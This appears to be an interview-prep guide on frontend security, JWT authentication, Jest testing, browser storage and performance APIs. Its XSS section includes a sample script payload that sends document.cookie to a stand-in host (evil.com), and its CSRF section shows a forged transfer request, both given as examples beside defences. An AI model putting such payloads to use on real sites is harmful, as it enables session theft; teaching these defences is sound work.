# ⚡ 08 — Security, Testing & Advanced Browser APIs
> **Most Asked in Product-Based Companies** | 🔴 Difficulty: Hard

---

## 🔑 Must-Know Topics
- XSS, CSRF, CSP security fundamentals
- Authentication: JWT, OAuth2, cookies vs localStorage
- Unit testing with Jest, integration testing with React Testing Library
- Browser storage: localStorage, sessionStorage, IndexedDB, cookies
- WebAssembly overview
- Performance APIs: Navigation Timing, PerformanceObserver

---

## ❓ Most Asked Questions

### Q1. What is XSS and how do you prevent it?

```javascript
// Cross-Site Scripting (XSS): attacker injects malicious scripts into trusted website

// Types:
// 1. Reflected XSS: malicious script in URL parameter
// 2. Stored XSS: script stored in database, served to all users
// 3. DOM-based XSS: client-side script writes attacker data to DOM

// ❌ Vulnerable: using innerHTML with user data
function displayComment(comment) {
    document.getElementById("output").innerHTML = comment;
    // If comment = "<script>fetch('evil.com?c='+document.cookie)</script>" → XSS!
}

// ✅ Prevention 1: use textContent (never parses HTML)
document.getElementById("output").textContent = comment;

// ✅ Prevention 2: DOMPurify for rich HTML content
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHTML, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'title', 'rel']
});

// ✅ Prevention 3: Content Security Policy header (server-side)
// Prevents inline scripts and restricts sources
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{randomValue}'

// ✅ Prevention 4: HttpOnly cookies (can't be accessed by JS)
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// Template sanitization (custom)
function safeTemplate(strings, ...values) {
    const sanitize = (v) => String(v)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

    return strings.reduce((html, str, i) => html + str + (values[i] != null ? sanitize(values[i]) : ''), '');
}

const username = '<script>alert("xss")</script>';
div.innerHTML = safeTemplate`<p>Welcome, ${username}!</p>`;
// Output: <p>Welcome, &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;!</p>
```

---

### Q2. What is CSRF and how to prevent it?

```javascript
// CSRF (Cross-Site Request Forgery): tricks user's browser into making
// authenticated requests to another site

// Attack scenario:
// 1. User logged into bank.com (has valid cookie)
// 2. User visits evil.com
// 3. evil.com has: <img src="bank.com/transfer?to=hacker&amount=10000">
// 4. Browser auto-sends bank.com session cookie with request → transfer happens!

// Prevention 1: CSRF tokens (server-generated, unique per session)
// Server: set <meta name="csrf-token" content="{{ csrfToken }}">
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Include in all state-changing requests
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken     // evil.com can't read this from cross-origin
    },
    body: JSON.stringify({ amount: 100 })
});

// Prevention 2: SameSite cookie attribute
// SameSite=Strict: cookie never sent on cross-site requests
// SameSite=Lax: sent on top-level navigation GET (but not POSTs from cross-site)
// Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly

// Prevention 3: Double Submit Cookie
// Server sets random value in cookie AND expects same in request header
// Evil site can't read cookies → can't set header → CSRF fails

// Prevention 4: Verify Origin/Referer header (server-side)
app.use((req, res, next) => {
    const origin = req.headers.origin || req.headers.referer;
    if (req.method !== 'GET' && !origin?.startsWith('https://mysite.com')) {
        return res.status(403).json({ error: 'CSRF check failed' });
    }
    next();
});
```

---

### Q3. JWT authentication — how it works and security considerations.

```javascript
// JWT: JSON Web Token — stateless authentication
// Structure: base64url(header).base64url(payload).signature

// Flow:
// 1. User logs in → server creates JWT → returns to client
// 2. Client stores JWT (where to store is the security question)
// 3. Client sends JWT in Authorization header on each request
// 4. Server verifies signature → extracts user info (no DB lookup needed)

// JWT creation (server — Node.js)
const jwt = require('jsonwebtoken');

function createTokens(user) {
    const payload = { sub: user.id, email: user.email, role: user.role };

    const accessToken = jwt.sign(payload, process.env.JWT_SECRET, {
        expiresIn: '15m',   // short-lived (if stolen, limited damage)
        algorithm: 'HS256'  // or RS256 for asymmetric (microservices)
    });

    const refreshToken = jwt.sign({ sub: user.id }, process.env.REFRESH_SECRET, {
        expiresIn: '7d'     // long-lived — stored as HttpOnly cookie
    });

    return { accessToken, refreshToken };
}

// JWT verification (server middleware)
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader?.split(' ')[1]; // "Bearer <token>"

    if (!token) return res.sendStatus(401);

    try {
        req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch (err) {
        if (err.name === 'TokenExpiredError') return res.sendStatus(401);
        return res.sendStatus(403);
    }
}

// ⚠️ Storage security:
// localStorage: accessible via JS → vulnerable to XSS → DON'T store tokens here
// sessionStorage: same issue
// ✅ HttpOnly cookie: JS can't read → XSS safe (but CSRF concern → use SameSite)
// ✅ Memory (React state): safest → lost on refresh → use refresh token in cookie

// Client-side token refresh
let accessToken = null;

async function apiRequest(url, options = {}) {
    // Set token in memory (not localStorage)
    const response = await fetch(url, {
        ...options,
        headers: { ...options.headers, Authorization: `Bearer ${accessToken}` }
    });

    if (response.status === 401 && !options._retry) {
        // Token expired — try to refresh
        const refreshed = await fetch('/auth/refresh', {
            method: 'POST',
            credentials: 'include' // sends HttpOnly refresh token cookie
        });

        if (refreshed.ok) {
            const { token } = await refreshed.json();
            accessToken = token; // update in-memory token
            return apiRequest(url, { ...options, _retry: true }); // retry once
        } else {
            logout(); // refresh failed — redirect to login
        }
    }

    return response;
}
```

---

### Q4. Testing JavaScript with Jest and React Testing Library.

```javascript
// Unit test: pure function
// math.js
export function add(a, b) { return a + b; }
export function divide(a, b) {
    if (b === 0) throw new Error("Division by zero");
    return a / b;
}

// math.test.js
import { add, divide } from './math';

describe('math utilities', () => {
    test('add returns correct sum', () => {
        expect(add(2, 3)).toBe(5);
        expect(add(-1, 1)).toBe(0);
    });

    test('divide throws on zero divisor', () => {
        expect(() => divide(10, 0)).toThrow("Division by zero");
    });
});

// Async testing
test('fetchUser returns user data', async () => {
    // Mock fetch
    global.fetch = jest.fn().mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ id: 1, name: "Alice" })
    });

    const user = await fetchUser(1);
    expect(user.name).toBe("Alice");
    expect(fetch).toHaveBeenCalledWith('/api/users/1');
});

// React Testing Library: test behavior, not implementation
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import LoginForm from './LoginForm';

describe('LoginForm', () => {
    test('submits form with user credentials', async () => {
        const mockLogin = jest.fn().mockResolvedValue({ success: true });
        const user = userEvent.setup();

        render(<LoginForm onLogin={mockLogin} />);

        // Find by accessible role — not by class/id
        await user.type(screen.getByRole('textbox', { name: /email/i }), 'alice@example.com');
        await user.type(screen.getByLabelText(/password/i), 'secret123');
        await user.click(screen.getByRole('button', { name: /sign in/i }));

        await waitFor(() => {
            expect(mockLogin).toHaveBeenCalledWith({
                email: 'alice@example.com',
                password: 'secret123'
            });
        });
    });

    test('shows validation error for empty email', async () => {
        render(<LoginForm />);
        await userEvent.click(screen.getByRole('button', { name: /sign in/i }));
        expect(screen.getByText(/email is required/i)).toBeInTheDocument();
    });
});

// Mocking modules
jest.mock('./api', () => ({
    getUser: jest.fn().mockResolvedValue({ id: 1, name: "Mock User" }),
    updateUser: jest.fn()
}));
```

---

### Q5. Browser Storage — localStorage, sessionStorage, IndexedDB, cookies.

```javascript
// localStorage: persists across sessions, ~5-10MB, synchronous (blocks!)
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme');    // 'dark'
localStorage.removeItem('theme');
localStorage.clear();

// sessionStorage: per-tab session only, same API as localStorage
sessionStorage.setItem('formDraft', JSON.stringify(draftData));

// ⚠️ Both are SYNCHRONOUS — block main thread on large data
// Both are vulnerable to XSS (don't store sensitive tokens here)
// Both limited to string values (need JSON.stringify/parse)

// IndexedDB: large structured data, async, supports transactions
// Typical use: offline data sync, local data cache for PWA

async function openDB() {
    return new Promise((resolve, reject) => {
        const request = indexedDB.open('MyApp', 1);

        request.onupgradeneeded = (event) => {
            const db = event.target.result;
            const store = db.createObjectStore('products', { keyPath: 'id' });
            store.createIndex('category', 'category', { unique: false });
        };

        request.onsuccess = () => resolve(request.result);
        request.onerror  = () => reject(request.error);
    });
}

async function saveProduct(product) {
    const db = await openDB();
    return new Promise((resolve, reject) => {
        const tx    = db.transaction('products', 'readwrite');
        const store = tx.objectStore('products');
        const req   = store.put(product);
        req.onsuccess = () => resolve(req.result);
        req.onerror   = () => reject(req.error);
    });
}

// Cookies: sent with every request, accessible in HTTP (HttpOnly = server only)
// Better managed with cookie libraries in production

function setCookie(name, value, days) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/; Secure; SameSite=Strict`;
}

function getCookie(name) {
    return document.cookie.split('; ')
        .find(row => row.startsWith(name + '='))
        ?.split('=')[1];
}

// Storage Comparison:
// | Feature      | Cookie     | localStorage | sessionStorage | IndexedDB |
// | Capacity     | ~4KB       | ~5MB         | ~5MB           | 50MB+     |
// | Expiry       | Configurable| Never       | Tab close      | Never     |
// | Server access| Yes        | No           | No             | No        |
// | Sync/Async   | Sync       | Sync         | Sync           | Async     |
```

---

### Q6. Measuring and monitoring frontend performance.

```javascript
// Navigation Timing API — page load metrics
window.addEventListener('load', () => {
    const timing = performance.getEntriesByType('navigation')[0];

    const metrics = {
        // Time to first byte (server response)
        TTFB: timing.responseStart - timing.requestStart,

        // DOM content parsed and loaded
        DOMContentLoaded: timing.domContentLoadedEventEnd - timing.fetchStart,

        // Full page load
        loadTime: timing.loadEventEnd - timing.fetchStart,

        // DNS lookup
        dnsLookup: timing.domainLookupEnd - timing.domainLookupStart,

        // TCP connection
        tcpConnect: timing.connectEnd - timing.connectStart
    };

    analytics.track('page_performance', metrics);
});

// Core Web Vitals monitoring
// LCP: Largest Contentful Paint (loading speed — target: <2.5s)
// FID: First Input Delay (interactivity — target: <100ms) 
// CLS: Cumulative Layout Shift (visual stability — target: <0.1)

const observer = new PerformanceObserver((entryList) => {
    for (const entry of entryList.getEntries()) {
        switch (entry.entryType) {
            case 'largest-contentful-paint':
                console.log('LCP:', entry.startTime);
                analytics.track('LCP', entry.startTime);
                break;

            case 'layout-shift':
                if (!entry.hadRecentInput) {
                    console.log('CLS contribution:', entry.value);
                }
                break;

            case 'first-input':
                console.log('FID:', entry.processingStart - entry.startTime);
                break;
        }
    }
});

observer.observe({ entryTypes: ['largest-contentful-paint', 'layout-shift', 'first-input'] });

// Mark custom performance markers
performance.mark('data-fetch-start');
await fetchUserData();
performance.mark('data-fetch-end');
performance.measure('data-fetch', 'data-fetch-start', 'data-fetch-end');

const measure = performance.getEntriesByName('data-fetch')[0];
console.log(`Data fetch took: ${measure.duration}ms`);

// Resource Timing: analyze individual resource load times
const resources = performance.getEntriesByType('resource');
const slowResources = resources.filter(r => r.duration > 500);
slowResources.forEach(r => console.warn(`Slow resource: ${r.name} (${r.duration}ms)`));
```

---

### Q7. How does browser JavaScript execution differ from Node.js?

```javascript
// Browser JavaScript:
// - Global object: window (with DOM, BOM APIs)
// - APIs: fetch, localStorage, document, navigator, history, crypto
// - ES modules (via <script type="module">)
// - Single JS engine per tab (isolated context)
// - Sandboxed: no file system, limited network

// Node.js:
// - Global object: global (or globalThis for both)
// - APIs: fs, path, http, crypto, process, Buffer, streams
// - CommonJS (require) or ESM (both supported)
// - C++ addons, native modules
// - Full system access (with user permissions)

// Key differences in code:

// 1. Global variables
// Browser: var x = 1 → window.x === 1
// Node.js: var x = 1 → x is NOT on global (module scope)

// 2. Module system  
// Browser: <script type="module"> or bundler
// Node.js: const fs = require('fs'); // CJS
//          import fs from 'fs';      // ESM

// 3. Event loop differences
// Browser: includes UI rendering, user events
// Node.js: includes I/O events, process.nextTick, setImmediate

// process.nextTick fires BEFORE Promise microtasks in Node.js!
process.nextTick(() => console.log("nextTick"));  // 1st
Promise.resolve().then(() => console.log("promise")); // 2nd
setTimeout(() => console.log("timeout"), 0);       // 3rd
// Output: nextTick → promise → timeout

// 4. Available APIs
// typeof window !== 'undefined'        → browser
// typeof process !== 'undefined'       → Node.js

// Universal code (works in both)
const isNode = typeof process !== 'undefined' && process.versions?.node;
const storage = isNode
    ? { get: k => process.env[k], set: (k, v) => process.env[k] = v }
    : { get: k => localStorage.getItem(k), set: (k, v) => localStorage.setItem(k, v) };
```
